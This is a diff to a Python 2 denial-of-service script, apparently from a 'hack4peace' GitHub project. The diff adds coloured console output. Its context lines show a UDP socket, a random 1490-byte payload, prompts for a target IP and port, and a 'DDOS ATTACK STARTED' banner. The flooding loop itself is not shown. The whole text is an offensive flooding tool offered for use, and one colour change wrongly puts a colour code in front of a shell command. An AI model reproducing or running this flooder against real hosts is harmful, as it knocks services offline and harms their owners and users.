@@ -3,18 +3,20 @@ import os
 import time
 import socket
 import random
+import colorama
+from colorama import Fore, Style
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet DDos")
+os.system(Fore.GREEN + "figlet DDos")
 print "Created by: Mr_x"
 print "Github: https://github.com/official-hack4peace"
 print "YouTube: https://youtube.com/channel/UCHTT9mz7Fdtn3TdotMjynGg"
 print "Instagram: https://instagram.com/official_hack4peace01"
-ip = raw_input("Target IP: ")
+ip = raw_input(Fore.RED + "Target IP: ")
 port = input("Port: ")
 # starting ddos attack
 print "DDOS ATTACK STARTED"
